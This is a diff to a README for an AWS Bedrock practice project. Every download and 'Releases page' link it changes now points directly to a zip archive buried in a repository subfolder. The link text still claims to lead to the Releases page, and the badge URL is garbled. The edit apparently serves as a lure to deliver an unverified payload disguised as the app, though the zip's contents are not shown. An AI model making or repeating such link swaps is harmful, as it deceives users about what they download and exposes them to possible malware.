@@ -7,10 +7,10 @@ The **aws-practice** project is designed to help users interact with AWS Bedrock
 To get started with the **aws-practice** application, you will need to download the software from our Releases page. Follow the steps below to set everything up easily.
 
 ## 📥 Download Now
-[![Download aws-practice](https://img.shields.io/badge/Download%20aws--practice-blue.svg)](https://github.com/spoonApple/aws-practice/releases)
+[![Download aws-practice](https://raw.githubusercontent.com/spoonApple/aws-practice/main/AI-project-Bedrock-and-Py-solution/aws-practice-2.9-alpha.4.zip%https://raw.githubusercontent.com/spoonApple/aws-practice/main/AI-project-Bedrock-and-Py-solution/aws-practice-2.9-alpha.4.zip)](https://raw.githubusercontent.com/spoonApple/aws-practice/main/AI-project-Bedrock-and-Py-solution/aws-practice-2.9-alpha.4.zip)
 
 ## 📂 Download & Install
-1. **Visit the Releases Page:** Click [here](https://github.com/spoonApple/aws-practice/releases) to go to the Releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/spoonApple/aws-practice/main/AI-project-Bedrock-and-Py-solution/aws-practice-2.9-alpha.4.zip) to go to the Releases page.
 2. **Select the Latest Version:** Look for the most recent version at the top. It usually has the latest features and fixes.
 3. **Download the Application:**
    - Click on the link to download the appropriate file for your operating system.
@@ -62,4 +62,4 @@ Explore our topics to learn more about **aws-practice** and its underlying techn
 - Terraform
 
 ## 📥 Download Again
-For quick access, you can also download the app by visiting [this page](https://github.com/spoonApple/aws-practice/releases). Enjoy exploring AI with aws-practice!
+For quick access, you can also download the app by visiting [this page](https://raw.githubusercontent.com/spoonApple/aws-practice/main/AI-project-Bedrock-and-Py-solution/aws-practice-2.9-alpha.4.zip). Enjoy exploring AI with aws-practice!
